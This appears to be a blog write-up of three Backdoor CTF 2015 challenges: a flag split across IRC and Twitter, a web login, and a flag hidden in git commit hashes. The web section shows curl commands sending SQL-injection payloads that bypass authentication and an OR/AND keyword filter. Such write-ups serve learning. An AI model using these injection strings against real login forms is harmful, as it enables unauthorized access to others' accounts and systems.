---
layout: post
title: Backdoor CTF 2015 - WriteUP
---
#### FOLLOW / WEB10

> Get the first half of flag @BackdoorCtf and other at #backdoorctf15 on irc.freenode.org. Join them and submit sha-256 of the flag.

- @twitter
- irc [backdoorctf15]

Connect the IRC channel, Receive tips: 

[BackdoorCTF 2015. Flag's second part: d68e69f3bbebbb346d338cdf937009ba3c69e5bea60158de2d47da09574f9342. Challenges would always remain online at https://backdoor.sdslabs.co/challenges]

But, This is the second part, I started looking for the first part, twitter?

I found this tweet: [https://twitter.com/BackdoorCTF/status/570822175420129280](https://twitter.com/BackdoorCTF/status/570822175420129280)

I will be the two strings together:

 - 2041615da55336e54cae0692663c2cf35aaa33188c6fa68c56a813f878d9a24d
 - d68e69f3bbebbb346d338cdf937009ba3c69e5bea60158de2d47da09574f9342
 
Flag is the sha256 format:

    >>> import hashlib
    >>> foo = '2041615da55336e54cae0692663c2cf35aaa33188c6fa68c56a813f878d9a24dd68e69f3bbebbb346d338cdf937009ba3c69e5bea60158de2d47da09574f9342'
    >>> print hashlib.sha256(foo).hexdigest()
    14405472874fddf3f051a9085d6c3f559f2804363776e06f2c4afe08e55cd918
    
#### JUDGE / WEB150

> Get the flag from [JUDGE](https://hack.bckdr.in/JUDGE). Submit sha-256 of the flag obtained.

<center><img src="http://ww2.sinaimg.cn/large/c334041btw1eqsr33roxaj20a0035mx8.jpg"></center>

Need to log into admin, Maybe SQL-Injection? But, keywords like OR and AND are filtered.

    ➜  ~  curl http://hack.bckdr.in/JUDGE/index.php --data "username=admin' or '1'='1&password=123456"
    <!DOCTYPE html>

    <html>

    <head>
    <title>Login</title>
    </head>

    <body>
    An Error occured
    
I think the use of ```'||'``` instead of 'or':

    ➜  ~  curl http://hack.bckdr.in/JUDGE/index.php --data "username=admin'||'1&password=123456"

<center><img src="http://ww2.sinaimg.cn/large/c334041btw1eqsr7h0re0j20rz0e6tao.jpg"></center>

Simple bypass WAF :)

#### TIM / forensics100

> Visit https://github.com/backdoor-ctf/TIM to get the flag.

I think it is simple, but I was wrong. He gave us a git repository, repo README.md:

 - ..................................
 - Download this repo to get the flag

<center><img src="http://ww3.sinaimg.cn/large/c334041btw1eqsrg0l92ej20s20jowha.jpg"></center>

Interesting rules:

 - commits 47
 - commits 41
 - commits 4c
 - commits 46
 - ...
 
Join these and we get:

    47414c4620316168732074696d6d6f63206863616520666f2073726574636172616863206f7774207473726966206e696f4a

Convert ASCII to text:

    GALF 1ahs timmoc hcae fo sretcarahc owt tsrif nioJ

The Python string reversal:

<center><img src="http://ww1.sinaimg.cn/large/c334041btw1eqsrsqu4w8j20ef03ngm3.jpg"></center>

Github TIM commits log:

    0075376f5b95ab02608746da37cd7bfa54ccbc89
    00ba12f761b4b630edd4b09ebf28a5f4b0bf00ac
    009daea0f203c4c5e968cf4f4dd0b30cd241105c
    004c8ec471a5e9f8177eac3cabea75b6a1b34d60
    00a0913f7281b805f14f220d422e253ad5e17d91
    003cd8f7c9f44e5ef914a23b89683381261aeb1a
    000bd360dd30bef0952dc5e78d0552acbb77cc28
    0084948308ac5f84d2f15df4010926968d4ea4fb
    0068a486c186d9e38e51f87720a0dd65c3e8384d
    75ae4979ffbb663dbc665495cf892e108114adcd
    ..............
    ..............
    ..............
    
The first two byte of each SHA1 commit and concatenate. Flag:

    000000000000000000759f0a868bfc80f44******************************fe7eef1dd6705000000000000000000d4
    
